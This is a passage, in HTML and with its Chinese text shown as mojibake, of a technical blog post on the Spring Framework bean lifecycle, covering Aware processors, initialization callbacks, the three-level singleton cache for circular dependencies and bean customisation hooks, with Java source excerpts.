<p>æ‰€ä»¥å¯¹äºæ‰©å±•çš„ <code>EnvironmentAwareã€ApplicationContextAwareã€ApplicationEventPublisherAware</code> ç­‰è¿™äº›å†…ç½®æ‰©å±•çš„é€šçŸ¥æ¥å£éœ€è¦é¢å¤–ç‰¹æ®Šå¤„ç†ï¼Œå› æ­¤ <code>Spring</code> æ¡†æ¶æŠŠè¿™ä¸ªå·¥ä½œæ”¾åˆ°äº†<code>ApplicationContextAwareProcessor#postProcessBeforeInitialization()</code> ä¸­</p>
<h3 data-id="heading-10">Aware æ¥å£åˆ†å¼€å¤„ç†çš„åŸå› </h3>
<p>å¦‚æœä»”ç»†æ€è€ƒä½ å¯èƒ½ä¼šç–‘æƒ‘ï¼Œæ—¢ç„¶ <code>Bean</code> åˆ›å»ºè¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ <code>invokeAwareMethods()</code>ï¼Œé‚£ä¸ºä»€ä¹ˆä¸æŠŠ<code>EnvironmentAwareã€ApplicationContextAwareã€ApplicationEventPublisherAware</code> è¿™äº›é€šçŸ¥æ¥å£ä¹Ÿæ”¾åˆ°è¿™ä¸ªæ–¹æ³•é‡Œè®¾ç½®å¯¹åº”çš„å€¼ï¼Œè€Œæ˜¯è¦å†å¼„ä¸€ä¸ª <code>ApplicationContextAwareProcessor</code> æ¥å®ç°å‘¢ï¼Ÿæ˜¯å¦å¤šæ­¤ä¸€ä¸¾ï¼ŸæŸ¥çœ‹ <code>ApplicationContextAwareProcessor#postProcessBeforeInitialization()</code> æºç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-meta">@Nullable</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessBeforeInitialization</span><span class="hljs-params">(Object bean, String beanName)</span> <span class="hljs-keyword">throws</span> BeansException {
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> Aware) {
       invokeAwareInterfaces(bean);
    }
    <span class="hljs-keyword">return</span> bean;
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAwareInterfaces</span><span class="hljs-params">(Object bean)</span> {
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> EnvironmentAware environmentAware) {
       environmentAware.setEnvironment(<span class="hljs-built_in">this</span>.applicationContext.getEnvironment());
    }
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> EmbeddedValueResolverAware embeddedValueResolverAware) {
       embeddedValueResolverAware.setEmbeddedValueResolver(<span class="hljs-built_in">this</span>.embeddedValueResolver);
    }
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> ResourceLoaderAware resourceLoaderAware) {
       resourceLoaderAware.setResourceLoader(<span class="hljs-built_in">this</span>.applicationContext);
    }
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> ApplicationEventPublisherAware applicationEventPublisherAware) {
       applicationEventPublisherAware.setApplicationEventPublisher(<span class="hljs-built_in">this</span>.applicationContext);
    }
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> MessageSourceAware messageSourceAware) {
       messageSourceAware.setMessageSource(<span class="hljs-built_in">this</span>.applicationContext);
    }
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> ApplicationStartupAware applicationStartupAware) {
       applicationStartupAware.setApplicationStartup(<span class="hljs-built_in">this</span>.applicationContext.getApplicationStartup());
    }
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> ApplicationContextAware applicationContextAware) {
       applicationContextAware.setApplicationContext(<span class="hljs-built_in">this</span>.applicationContext);
    }
}
</code></pre>
<p><strong>å¯ä»¥çœ‹åˆ°è¿™æ˜¯å› ä¸º <code>EnvironmentAware</code> ç­‰æ¥å£éœ€è¦è®¾ç½®çš„æˆå‘˜å˜é‡éƒ½æ˜¯ <code>ApplicationContext</code> å†…éƒ¨çš„å¯¹è±¡ï¼Œè€Œ <code>DefaultListableBeanFactory</code> ä»è®¾è®¡ä¸Šæ¥è¯´æ˜¯ä¸è¯¥æŒæœ‰ <code>ApplicationContext</code> çš„å¼•ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>DefaultListableBeanFactory</code> æ‹¿ä¸åˆ°è¿™äº›å¯¹è±¡ï¼Œæ˜¯ <code>ApplicationContext</code> å®¹å™¨æŒæœ‰ <code>DefaultListableBeanFactory</code> çš„å¼•ç”¨ã€‚è€Œ <code>DefaultListableBeanFactory</code> æ²¡æœ‰è¿™äº›å¯¹è±¡ï¼Œæ‰€ä»¥æ— æ³•åœ¨ <code>invokeAwareMethods()</code> è®¾ç½®</strong></p>
<h2 data-id="heading-11">InitializingBean</h2>
<p>è¿™æ˜¯ä¸€ä¸ª <code>Bean</code> çš„åˆå§‹åŒ–æ¥å£ï¼Œåœ¨ <code>BeanPostProcessor#postProcessBeforeInitialization</code> ä¹‹åè°ƒç”¨ï¼Œä»æ–¹æ³•åå¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶å±æ€§å·²ç»å…¨éƒ¨è®¾ç½®å®Œæ¯•ã€‚æˆ‘ä»¬å¯ä»¥å®ç° <code>InitializingBean</code> åœ¨ <code>afterPropertiesSet()</code> ä¸­åšä¸€äº›è‡ªå®šä¹‰é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">InitializingBean</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;
}
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼Œè¿™é‡ŒæŒ‡çš„å±æ€§æ˜¯è¢« <code>Spring</code> å®¹å™¨ç®¡ç†çš„å±æ€§ï¼Œä¸åŒ…æ‹¬æˆ‘ä»¬è‡ªå®šä¹‰çš„å±æ€§ï¼Œä¾‹å¦‚ä½¿ç”¨ <code>@Autowiredã€@Value</code> æ ‡æ³¨çš„å±æ€§ï¼Œæˆ–è€…å®ç° <code>Aware</code> æ¥å£ä¹‹å <code>setApplicationContext</code> ç­‰æ–¹æ³•ä¸­çš„å±æ€§ã€‚</p>
<p>è¿™äº›è¢« <code>Spring</code> å®¹å™¨ç®¡ç†çš„å±æ€§èµ‹å€¼å®Œæ¯•åä¼šè°ƒç”¨è¿™ä¸ª <code>afterPropertiesSet()</code> æ–¹æ³•</p>
</blockquote>
<h2 data-id="heading-12">è°ƒç”¨ @Bean(initMethod = "xxx")</h2>
<p><code>afterPropertiesSet()</code> è°ƒç”¨ä¹‹åï¼Œä¼šç´§æ¥ç€è°ƒç”¨è‡ªå®šä¹‰çš„ <code>init</code> æ–¹æ³•ã€‚</p>
<h2 data-id="heading-13">SmartInitializingSingleton</h2>
<p>è¿™ä¸ªæ¥å£çš„ä½œç”¨æ˜¯å½“æ‰€æœ‰å•ä¾‹ <code>Bean</code> è¢«åˆ›å»ºå®Œæˆä¹‹åï¼Œè°ƒç”¨å…¶æ–¹æ³•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SmartInitializingSingleton</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterSingletonsInstantiated</span><span class="hljs-params">()</span>;
}
</code></pre>
<p>ä¸€ä¸ªå…¸å‹çš„å®ç°å°±æ˜¯ <code>EventListenerMethodProcessor</code>ï¼Œå½“æ‰€æœ‰å•ä¾‹ <code>Bean</code> åˆ›å»ºå®Œæˆä¹‹åï¼Œ<code>EventListenerMethodProcessor.afterSingletonsInstantiated()</code> ä¼šéå†æ‰€æœ‰åˆ›å»ºå®Œæˆçš„ <code>Bean</code>ï¼ŒæŸ¥æ‰¾è¢«  <code>@EventListenerã€@TransactionalEventListener</code> æ³¨è§£çš„ï¼Œæ ¹æ®ä¸åŒçš„ <code>EventListenerFactory</code> åˆ›å»ºä¸åŒçš„ <code>ApplicationListener</code> å®ç°ï¼Œæ·»åŠ åˆ°å½“å‰ <code>ApplicationContext</code> ä¸­ã€‚è¿™å°±æ˜¯ <code>Spring</code> äº‹ä»¶çš„åŸºæœ¬åŸç†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPublish1</span><span class="hljs-params">()</span>{
    publisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestEvent</span>(<span class="hljs-built_in">this</span>,<span class="hljs-number">1L</span>));
}

<span class="hljs-meta">@EventListener</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenerTestPublish1</span><span class="hljs-params">(TestEvent event)</span>{
    log.info(<span class="hljs-string">"listenerTestPublish1 TestEvent:{}"</span>,event);
}
</code></pre>
<p>å½“æ‰§è¡Œ <code>publisher.publishEvent()</code> æ—¶ï¼Œå°±ä¼šå» <code>ApplicationContext</code> å†…éƒ¨æå‰å­˜å‚¨çš„ç›‘å¬å™¨åˆ—è¡¨ä¸­å¯»æ‰¾ç¬¦åˆçš„ç›‘å¬å™¨ï¼Œç„¶åæ‰§è¡Œã€‚å¯èƒ½ä¼šå­˜åœ¨å¤šä¸ªï¼Œè¿™ç›¸å½“äºå¹¿æ’­æœ¬åœ°æ¶ˆæ¯ã€‚å¯åŒæ­¥æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥å¼‚æ­¥æ‰§è¡Œï¼Œç”šè‡³è¿˜èƒ½æ¡ä»¶æ‰§è¡Œï¼Œç»‘å®šäº‹åŠ¡æ‰§è¡Œï¼Œåé¢ä¼šè¯¦ç»†å‰–æ <code>Spring</code> äº‹ä»¶çš„åŸç†</p>
<p><strong><code>SmartInitializingSingleton</code> æ˜¯åœ¨æ‰€æœ‰å•ä¾‹ Bean åˆ›å»ºå®Œæˆä¹‹åæ‰§è¡Œï¼Œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç”Ÿå‘½å‘¨æœŸæ¥å£</strong></p>
<h2 data-id="heading-14">è®©äººè´¹è§£çš„ä¸‰çº§ç¼“å­˜</h2>
<p>å…¶å®æ ‡é¢˜æƒ³è¡¨è¾¾çš„å¹¶ä¸æ˜¯ä¸‰çº§ç¼“å­˜å¾ˆå¤æ‚ï¼Œå€’æ˜¯æˆ‘ä¸æ˜ç™½è¿™ä¸œè¥¿ä¸ºä»€ä¹ˆèƒ½ä¸€åº¦æˆä¸ºé«˜é¢‘é¢è¯•é¢˜ï¼Œä¸‹é¢è¿™æ®µæ˜¯è¿™ä¸‰ä¸ªç¼“å­˜é›†åˆ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸€çº§ç¼“å­˜ï¼ˆBean å®¹å™¨ï¼‰ï¼šå­˜æ”¾å®Œå…¨åˆå§‹åŒ–å¥½çš„å•ä¾‹ Beanï¼ˆæˆå“ï¼‰  </span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; singletonObjects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="hljs-number">256</span>);  

<span class="hljs-comment">// äºŒçº§ç¼“å­˜ï¼šå­˜æ”¾æ—©æœŸçš„ Beanï¼ˆå·²å®ä¾‹åŒ–æœªåˆå§‹åŒ–çš„åŠæˆå“ï¼‰ï¼Œè§£å†³å¾ªç¯ä¾èµ–  </span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; earlySingletonObjects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="hljs-number">16</span>);  

<span class="hljs-comment">// ä¸‰çº§ç¼“å­˜ï¼šå­˜æ”¾å•ä¾‹å·¥å‚ï¼Œç”¨äºåˆ›å»ºæ—©æœŸå¼•ç”¨ï¼ˆå¯èƒ½ç”Ÿæˆä»£ç†å¯¹è±¡ï¼‰  </span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, ObjectFactory&lt;?&gt;&gt; singletonFactories = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">16</span>);
</code></pre>
<p>å…¶å®å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åˆ›å»ºè¿‡ç¨‹ï¼Œå‡è®¾ç°åœ¨æˆ‘ä»¬å¾ªç¯ä¾èµ–çš„ä¸¤ä¸ª <code>Bean</code> éƒ½éœ€è¦è¢«ä»£ç†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff64cfc41a284610abe45d946bf8e786~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pqu6Imy5aaW5aiG5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228098&amp;x-signature=gFW8mYZXPaEocBkYFYjD2Xyfyu0%3D" alt="image.png" loading="lazy"/></p>
<p><code>A</code> ä¸ <code>B</code> å¾ªç¯ä¾èµ–çš„åœºæ™¯ï¼Œå…ˆå®ä¾‹åŒ– <code>A</code>ï¼Œç„¶ååˆ›å»º <code>A</code> çš„å®Œæ•´ <code>Bean</code>ï¼Œç»“æœå‘ç° <code>A</code> ä¾èµ– <code>B</code>ï¼Œç„¶åç«‹å³å»åˆ›å»º <code>B</code> çš„å®Œæ•´ <code>Bean</code>ï¼Œå‘ç°éœ€è¦ <code>A</code>ï¼Œä½†æ˜¯ <code>A</code> çš„å®ä¾‹å·²ç»æœ‰äº†ï¼Œåªæ˜¯ <code>A</code> è¿˜ä¸æ˜¯å®Œæ•´çš„ <code>Bean</code>ï¼Œä½†æ˜¯è¿™å®Œå…¨ä¸å½±å“ï¼Œåªè¦ <code>A</code> çš„å®ä¾‹æœ‰äº†ï¼Œ<code>B</code> å°±å¯ä»¥æŒæœ‰ <code>A</code> çš„å¼•ç”¨ï¼Œè‡³äºå®ƒä»€ä¹ˆæ—¶å€™å˜æˆå®Œæ•´çš„ <code>Bean</code>ï¼Œ<code>B</code> æ˜¯ä¸å…³å¿ƒçš„ï¼Œå› ä¸º <code>B</code> å·²ç»æŒæœ‰ <code>A</code> çš„å¼•ç”¨ï¼Œ<code>A</code> å˜æˆå®Œæ•´ <code>Bean</code> çš„è¿‡ç¨‹åªæ˜¯ <code>A</code> å¯¹è±¡çš„å†…å­˜å†…å®¹å‘ç”Ÿå˜åŒ–ï¼Œå†…å­˜åœ°å€ä¸ä¼šå˜ã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">AService åˆ›å»ºå¼€å§‹
  â†’ å®ä¾‹åŒ–åŸå§‹å¯¹è±¡
  â†’ æ—©æœŸå¼•ç”¨å·¥å‚æ”¾å…¥ä¸‰çº§ç¼“å­˜
  â†’ éœ€è¦æ³¨å…¥ BService
  â†’ åˆ›å»º BService
<span class="hljs-code">    â†’ å®ä¾‹åŒ– BService åŸå§‹å¯¹è±¡
    â†’ æ—©æœŸå¼•ç”¨å·¥å‚æ”¾å…¥ä¸‰çº§ç¼“å­˜
    â†’ éœ€è¦æ³¨å…¥ AService
    â†’ ä»ä¸‰çº§ç¼“å­˜è·å– AService
    â†’ åˆ›å»º AService æ—©æœŸä»£ç†ï¼ˆç¬¬ä¸€æ¬¡ä»£ç†ç”Ÿæˆï¼‰
    â†’ æ³¨å…¥åˆ° BService
    â†’ BService åˆå§‹åŒ–å®Œæˆ
    â†’ åˆ›å»º BService æœ€ç»ˆä»£ç†ï¼ˆç¬¬äºŒæ¬¡ä»£ç†ç”Ÿæˆï¼‰
    â†’ BService å®Œæˆ
  â†’ BService ä»£ç†æ³¨å…¥åˆ° AService
  â†’ AService åˆå§‹åŒ–å®Œæˆ
  â†’ ä½¿ç”¨æ—©æœŸä»£ç†ä½œä¸ºæœ€ç»ˆä»£ç†
  â†’ AService å®Œæˆ
</span></code></pre>
<p>æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª <code>A â†’ B â†’ A</code> çš„é—®é¢˜ï¼Œæˆ‘ä¸æ˜ç™½ä¸ºä»€ä¹ˆèƒ½æˆä¸ºé«˜é¢‘é¢è¯•é¢˜ï¼Œè¿™ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆé«˜éš¾åº¦æŠ€æœ¯å«é‡ï¼Œä»ä¸‰çº§ç¼“å­˜è·å– <code>Bean</code> æºç å¦‚ä¸‹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">getSingleton</span><span class="hljs-params">(String beanName, <span class="hljs-type">boolean</span> allowEarlyReference)</span> {
    <span class="hljs-comment">// ä»ä¸€çº§ç¼“å­˜è·å–</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">singletonObject</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.singletonObjects.get(beanName);
    <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span> &amp;&amp; isSingletonCurrentlyInCreation(beanName)) {
       <span class="hljs-comment">//ä¸€çº§ç¼“å­˜æ²¡æœ‰ï¼Œå†ä»äºŒçº§ç¼“å­˜è·å–</span>
       singletonObject = <span class="hljs-built_in">this</span>.earlySingletonObjects.get(beanName);
       <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span> &amp;&amp; allowEarlyReference) {
          <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.singletonLock.tryLock()) {
             <span class="hljs-comment">// Avoid early singleton inference outside of original creation thread.</span>
             <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
          }
          <span class="hljs-keyword">try</span> {
             <span class="hljs-comment">// åŠ é”å†æ¬¡åˆ¤æ–­ä¸€çº§ç¼“å­˜</span>
             singletonObject = <span class="hljs-built_in">this</span>.singletonObjects.get(beanName);
             <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">//å†åˆ¤æ–­äºŒçº§ç¼“å­˜</span>
                singletonObject = <span class="hljs-built_in">this</span>.earlySingletonObjects.get(beanName);
                <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span>) {
                   <span class="hljs-comment">//ä»ä¸‰çº§ç¼“å­˜è·å–</span>
                   ObjectFactory&lt;?&gt; singletonFactory = <span class="hljs-built_in">this</span>.singletonFactories.get(beanName);
                   <span class="hljs-keyword">if</span> (singletonFactory != <span class="hljs-literal">null</span>) {
                      singletonObject = singletonFactory.getObject();
                      <span class="hljs-comment">// ä¸‰çº§ç¼“å­˜è·å–åˆ°å°±æ”¾å…¥äºŒçº§ç¼“å­˜</span>
                      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.singletonFactories.remove(beanName) != <span class="hljs-literal">null</span>) {
                         <span class="hljs-built_in">this</span>.earlySingletonObjects.put(beanName, singletonObject);
                      }
                      <span class="hljs-keyword">else</span> {
                         singletonObject = <span class="hljs-built_in">this</span>.singletonObjects.get(beanName);
                      }
                   }
                }
             }
          }
          <span class="hljs-keyword">finally</span> {
             <span class="hljs-built_in">this</span>.singletonLock.unlock();
          }
       }
    }
    <span class="hljs-keyword">return</span> singletonObject;
}
</code></pre>
<h3 data-id="heading-15">çœŸçš„éœ€è¦ç¬¬ä¸‰çº§ç¼“å­˜å—</h3>
<p>æˆ‘ä»¬æ€è€ƒè¿™ä¸ªåœºæ™¯ï¼Œæ˜¯å¦ä¸€å®šéœ€è¦ä¸‰çº§ç¼“å­˜ï¼Œå¦‚æœæ¢æˆäºŒçº§ç¼“å­˜æ˜¯å¦å¯ä»¥ï¼Ÿå…¶å®å¦‚æœæ‰€æœ‰çš„ <code>Bean</code> éƒ½ä¸éœ€è¦ä»£ç†çš„è¯ï¼Œå®Œå…¨å¯ä»¥ã€‚ç¬¬ä¸‰çº§çš„ç¼“å­˜å°±æ˜¯ä¸ºäº†è§£å†³ä¾èµ–çš„ <code>Bean</code> éœ€è¦è¢«ä»£ç†å­˜åœ¨çš„ï¼Œå¦‚æœå…è®¸å¾ªç¯ä¾èµ–ï¼Œåœ¨åˆ›å»º <code>Bean</code> çš„è¿‡ç¨‹ä¸­</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">boolean</span> <span class="hljs-variable">earlySingletonExposure</span> <span class="hljs-operator">=</span> (mbd.isSingleton() &amp;&amp; <span class="hljs-built_in">this</span>.allowCircularReferences &amp;&amp;
       isSingletonCurrentlyInCreation(beanName));
<span class="hljs-keyword">if</span> (earlySingletonExposure) {
    addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));
}
</code></pre>
<p>ä¼šå‘ç¬¬ä¸‰çº§ç¼“å­˜ä¸­å­˜æ”¾ä¸€ä¸ªå·¥å‚æ–¹æ³•ï¼Œç”¨æ¥è·å– <code>Bean</code> çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>singletonFactories</code> ç¬¬ä¸‰çº§ç¼“å­˜çš„ <code>value</code> æ˜¯ä¸€ä¸ª <code>ObjectFactory&lt;?&gt;</code> ã€‚</p>
<p>æ‰€è°“ç¬¬ä¸‰çº§ç¼“å­˜å°±æ˜¯åœ¨å†…å­˜é‡Œæ‰¾ä¸ªåœ°æ–¹å…ˆå­˜ç€è¿™ä¸ªå·¥å‚å›è°ƒæ–¹æ³•ï¼Œç­‰åˆ›å»ºå½“å‰ <code>A</code> æ‰€ä¾èµ–çš„ <code>B</code> æ—¶ï¼Œå‘ç° <code>B</code> éœ€è¦ <code>A</code>ï¼Œé‚£ä¹ˆå°±ä»è¿™é‡Œæ¥è·å– <code>A</code> çš„çœŸå®å¼•ç”¨ï¼Œå› ä¸º <code>A</code> å®ä¾‹çš„å¼•ç”¨å·²ç»å­˜åœ¨äº†ï¼Œå¦‚æœä¸éœ€è¦ä»£ç†é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è·å–è¿™ä¸ª <code>A</code> çš„å®ä¾‹å¼•ç”¨å³å¯ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸ºäº†é˜²æ­¢ <code>A</code> æ˜¯ä¸€ä¸ªæœ‰äº‹åŠ¡çš„ <code>Bean</code>ï¼Œé˜²æ­¢å®ƒéœ€è¦è¢«ä»£ç†ï¼Œæ‰€ä»¥ä»è¿™ä¸ªå·¥å‚è·å–çœŸå®å¼•ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">getEarlyBeanReference</span><span class="hljs-params">(String beanName, RootBeanDefinition mbd, Object bean)</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">exposedObject</span> <span class="hljs-operator">=</span> bean;
    <span class="hljs-keyword">if</span> (!mbd.isSynthetic() &amp;&amp; hasInstantiationAwareBeanPostProcessors()) {
       <span class="hljs-keyword">for</span> (SmartInstantiationAwareBeanPostProcessor bp : getBeanPostProcessorCache().smartInstantiationAware) {
          exposedObject = bp.getEarlyBeanReference(exposedObject, beanName);
       }
    }
    <span class="hljs-keyword">return</span> exposedObject;
}
</code></pre>
<p><code>AbstractAutoProxyCreator#getEarlyBeanReference()</code> ä¼šè¿”å›è¢«ä»£ç†åï¼ˆå¦‚æœéœ€è¦ï¼‰çš„å¯¹è±¡å¼•ç”¨</p>
<h3 data-id="heading-16">å›å¤´å†çœ‹ä¸‰çº§ç¼“å­˜</h3>
<p>å…¶å®æŠ›å¼€ <code>singletonObjects</code> å…ˆä¸è°ˆï¼Œå› ä¸ºå®ƒæ˜¯ <code>Bean</code> å®¹å™¨ï¼Œåªæœ‰ä¸¤ä¸ªç¼“å­˜çš„ <code>ConcurrentHashMap</code>ï¼Œ<code>singletonFactories</code> æ˜¯å­˜æ”¾æ—©æœŸå¼•ç”¨çš„è·å–å·¥å‚ï¼Œå› ä¸ºæˆ‘ä»¬ä¸ç¡®å®šæ˜¯å¦ä¼šå‘ç”Ÿå¾ªç¯ä¾èµ–ï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚è€Œ <code>earlySingletonObjects</code> å°±æ˜¯å­˜æ”¾è°ƒç”¨æ—©æœŸå¼•ç”¨å·¥å‚åè·å–çš„å¼•ç”¨ï¼Œå¦‚æœéœ€è¦è¢«ä»£ç†ï¼Œå­˜å‚¨çš„å°±æ˜¯ä»£ç†å¯¹è±¡ï¼Œå¦‚æœä¸éœ€è¦è¢«ä»£ç†ï¼Œå­˜å‚¨çš„å°±æ˜¯åŸå§‹å¯¹è±¡ã€‚</p>
<p>å› ä¸ºå·¥å‚æ‰§è¡Œåè¿”å›çš„æ˜¯æœ€ç»ˆçœŸå®ä»£ç†å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦æœ‰ä¸ªåœ°æ–¹å­˜å‚¨å®ƒï¼Œæ‰€ä»¥äºŒçº§ç¼“å­˜ <code>earlySingletonObjects</code> æ˜¯å¿…è¦çš„</p>
<p><strong>è¯´ç™½äº†å°±æ˜¯æˆ‘éœ€è¦æ‰¾ä¸ªåœ°æ–¹ä¸´æ—¶å­˜æ”¾ä¸€ä¸‹è¿™ä¸¤ä¸ªæ“ä½œå¾—åˆ°çš„ç»“æœï¼Œè‡³äºä½ å­˜åœ¨å“ªæ— æ‰€è°“ï¼Œæ‰€è°“çš„ä¸‰çº§ç¼“å­˜ä¸è¿‡æ˜¯è¿™äº›é¢è¯•å®˜è‡ªå·±å‡­ç©ºå®šä¹‰å‡ºæ¥çš„æ¦‚å¿µç½¢äº†</strong>ã€‚</p>
<h2 data-id="heading-17">è‡ªå®šä¹‰æ‰©å±•ä¿®æ”¹ä¸€ä¸ª Bean çš„æ–¹å¼</h2>
<p>ç°åœ¨æˆ‘ä»¬æ¥æ€è€ƒå‡å¦‚æˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰æ‰©å±•ï¼Œä¿®æ”¹ä¸€ä¸ª <code>Spring Bean</code> æœ‰å“ªäº›æ–¹å¼</p>
<h3 data-id="heading-18">ä¿®æ”¹ BeanDefiniton</h3>
<p>å› ä¸º <code>Bean</code> çš„åˆ›å»ºæ˜¯æ ¹æ® <code>BeanDefinition</code> å†³å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ <code>BeanFactoryPostProcessor</code> ï¼Œæ ¹æ® <code>beanDefinitionNames</code> è·å–æŒ‡å®šçš„ <code>BeanDefinition</code> å¯¹å…¶å±æ€§è¿›è¡Œä¿®æ”¹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> BeanFactoryPostProcessor <span class="hljs-title function_">myBeanFactoryPostProcessor</span><span class="hljs-params">()</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanFactoryPostProcessor</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postProcessBeanFactory</span><span class="hljs-params">(ConfigurableListableBeanFactory beanFactory)</span> <span class="hljs-keyword">throws</span> BeansException {
            <span class="hljs-type">BeanDefinition</span> <span class="hljs-variable">testBean</span> <span class="hljs-operator">=</span> beanFactory.getBeanDefinition(<span class="hljs-string">"testBean"</span>);
            testBean.setAttribute(<span class="hljs-string">"name"</span>, <span class="hljs-string">"test"</span>);<span class="hljs-comment">//ä¿®æ”¹æŒ‡å®šå±æ€§</span>
        }
    };
}
</code></pre>
<h3 data-id="heading-19">è‡ªå®šä¹‰ BeanPostProcessor</h3>
<p>å› ä¸ºæ‰€æœ‰ <code>Bean</code> åˆ›å»ºéƒ½ä¼šæ‰§è¡Œ <code>BeanPostProcessor</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ª <code>BeanPostProcessor</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> BeanPostProcessor <span class="hljs-title function_">myBeanPostProcessor</span><span class="hljs-params">()</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanPostProcessor</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessAfterInitialization</span><span class="hljs-params">(Object bean, String beanName)</span> <span class="hljs-keyword">throws</span> BeansException {
            <span class="hljs-keyword">if</span>(beanName.equals(<span class="hljs-string">"testBean"</span>)){
                <span class="hljs-comment">//å…ˆå¼ºè½¬ bean</span>
                <span class="hljs-comment">//ç„¶åè®¾ç½®å±æ€§</span>
            }
            <span class="hljs-keyword">return</span> BeanPostProcessor.<span class="hljs-built_in">super</span>.postProcessAfterInitialization(bean, beanName);
        }
    };
}
</code></pre>
<p>åˆ¤æ–­å½“æ‰§è¡Œåˆ°æˆ‘ä»¬ç›®æ ‡ <code>Bean</code> çš„æ—¶å€™å¯¹å…¶ä¿®æ”¹</p>
<h3 data-id="heading-20">å®šä¹‰ Customizers</h3>
<p>å¾ˆå¤š <code>SpringBoot</code> è‡ªåŠ¨é…ç½®çš„ <code>Bean</code> ä¸ºäº†æ–¹ä¾¿éƒ½ç»™å¼€å‘è€…é¢„ç•™äº†å®¢æˆ·å®šåˆ¶åŒ–å™¨ï¼Œä¾‹å¦‚äº‹åŠ¡ç®¡ç†å™¨çš„è‡ªåŠ¨é…ç½®</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span>
